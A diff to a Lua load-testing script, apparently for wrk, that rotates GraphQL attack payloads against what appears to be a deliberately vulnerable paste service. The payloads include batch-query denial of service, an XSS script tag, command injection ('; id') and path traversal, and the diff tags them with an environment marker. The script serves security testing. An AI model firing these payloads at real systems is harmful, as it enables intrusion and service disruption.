@@ -2,6 +2,7 @@
 -- Rotates through batch DoS, deep recursion, field duplication, SQLi, XSS mutations
 
 local counter = 0
+local marker = assert(os.getenv("TGEN_FAMILY_MARKER"), "family journal marker required")
 
 local payloads = {
   -- Batch query DoS (5x systemUpdate)
@@ -15,7 +16,7 @@ local payloads = {
   -- Normal paste listing
   '{"query":"{pastes{id title content}}"}',
   -- XSS createPaste
-  '{"query":"mutation{createPaste(title:\\"<script>alert(1)</script>\\",content:\\"torture\\",public:true){paste{id}}}"}',
+  '{"query":"mutation{createPaste(title:\\"<script>alert(1)</script>\\",content:\\"' .. marker .. ':torture\\",public:true){paste{id}}}"}',
   -- systemHealth
   '{"query":"{systemHealth}"}',
   -- Batch with mixed operations
@@ -23,7 +24,7 @@ local payloads = {
   -- importPaste command injection
   '{"query":"mutation{importPaste(host:\\"localhost\\",port:80,path:\\"/  ; id\\",scheme:\\"http\\"){result}}"}',
   -- uploadPaste path traversal
-  '{"query":"mutation{uploadPaste(filename:\\"../../../tmp/test.txt\\",content:\\"test\\"){result}}"}',
+  '{"query":"mutation{uploadPaste(filename:\\"../../../tmp/' .. marker .. '-traversal.txt\\",content:\\"' .. marker .. ':traversal test\\"){result}}"}',
 }
 
 request = function()
